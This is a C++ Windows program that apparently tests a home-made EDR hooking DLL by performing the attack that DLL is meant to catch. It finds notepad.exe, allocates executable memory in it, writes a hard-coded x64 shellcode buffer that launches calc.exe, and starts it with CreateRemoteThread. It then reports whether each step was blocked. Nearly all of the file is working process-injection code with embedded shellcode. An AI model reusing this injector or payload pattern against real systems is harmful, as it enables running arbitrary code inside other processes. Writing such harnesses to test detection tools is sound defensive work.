#include <windows.h>
#include <string>
#include <iostream>
#include <tlhelp32.h>

// ====== Helper to self-inject vhook.dll ======
std::wstring GetSelfDirectory() {
    wchar_t buffer[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    std::wstring selfPath(buffer);
    size_t lastSlash = selfPath.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        return selfPath.substr(0, lastSlash + 1);
    }
    return L".\\";
}

bool InjectIntoSelf() {
    std::wstring dllPath = GetSelfDirectory() + L"vhook.dll";
    
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return false;

    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibraryW) return false;

    HANDLE hProcess = GetCurrentProcess();

    SIZE_T pathSize = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID pRemote = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) return false;

    if (!WriteProcessMemory(hProcess, pRemote, dllPath.c_str(), pathSize, NULL)) {
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
                                        pRemote, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        return true;
    }

    VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
    return false;
}

// Function to search for a process by name and return its PID
DWORD GetProcessIdByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take a snapshot of processes." << std::endl;
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (std::wstring(pe32.szExeFile) == processName) {
                DWORD pid = pe32.th32ProcessID;
                CloseHandle(hSnapshot);
                return pid;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Helper: Inject a DLL into a target process by PID
bool InjectDll(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "Failed to open target process for DLL injection. Error: " << GetLastError() << std::endl;
        return false;
    }

    size_t pathLen = strlen(dllPath) + 1;
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemotePath) {
        std::cerr << "Failed to allocate memory for DLL path in target. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemotePath, dllPath, pathLen, NULL)) {
        std::cerr << "Failed to write DLL path into target. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        std::cerr << "Failed to get kernel32 handle." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibraryA) {
        std::cerr << "Failed to get LoadLibraryA address." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemotePath, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread for DLL injection. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "Waiting for DLL injection to complete..." << std::endl;
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "DLL injection completed." << std::endl;
    return true;
}

int main() {
    // STEP 0: Inject vhook.dll into OURSELVES (DLLLoader.exe)
    std::cout << "[+] Attempting to self-inject vhook.dll..." << std::endl;
    if (!InjectIntoSelf()) {
        std::cerr << "[-] Warning: Failed to self-inject vhook.dll. EDR hooks may not trigger!" << std::endl;
    } else {
        std::cout << "[+] Successfully loaded vhook.dll into DLLLoader.exe" << std::endl;
        Sleep(1000); // Let DllMain run and hooks activate
    }

    // Rest of your original logic
    const std::wstring targetProcessName = L"notepad.exe";
    std::wcout << "Searching for process: " << targetProcessName << std::endl;

    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0) {
        std::cout << "Process not found... exiting!" << std::endl;
        std::cin.get();
        return 1;
    }
    std::cout << "Found process with PID: " << pid << std::endl;

    // Inject EDR into target (optional, but good for completeness)
    if (!InjectDll(pid, "vhook.dll")) {
        std::cerr << "Failed to inject EDR DLL into target process!" << std::endl;
        return 1;
    }

    std::cout << "vhook.dll injected into target process - EDR hooks active!" << std::endl;
    std::cout << "Waiting 2 seconds for hooks to initialize..." << std::endl;
    Sleep(2000);

    // Malicious shellcode (calc.exe)
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (pHandle == NULL) {
        std::cerr << "Failed to open process for injection. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Allocate RWX memory → should be BLOCKED if enforcement is on
    LPVOID rBuffer = VirtualAllocEx(pHandle, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (rBuffer == NULL) {
        std::cerr << "VirtualAllocEx failed (likely blocked by EDR!). Error: " << GetLastError() << std::endl;
        CloseHandle(pHandle);
        std::cout << "EDR blocked memory allocation!" << std::endl;
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 0;
    }
    std::cout << "Allocated memory at: " << rBuffer << std::endl;

    if (!WriteProcessMemory(pHandle, rBuffer, buf, sizeof(buf), NULL)) {
        std::cerr << "WriteProcessMemory failed (blocked by EDR?). Error: " << GetLastError() << std::endl;
        CloseHandle(pHandle);
        std::cout << "EDR blocked shellcode write!" << std::endl;
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 0;
    }
    std::cout << "Shellcode written." << std::endl;

    // Create remote thread → THIS is where your HookedCreateRemoteThread should BLOCK
    HANDLE hThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cout << "CreateRemoteThread BLOCKED by EDR! (Success!)" << std::endl;
        CloseHandle(pHandle);
        std::cout << "Press Enter to exit...";
        std::cin.get();
        return 0;
    }

    std::cout << "WARNING: Remote thread created — EDR DID NOT BLOCK INJECTION!" << std::endl;

    CloseHandle(hThread);
    CloseHandle(pHandle);
    std::cout << "Press Enter to exit...";
    std::cin.get();
    return 0;
}
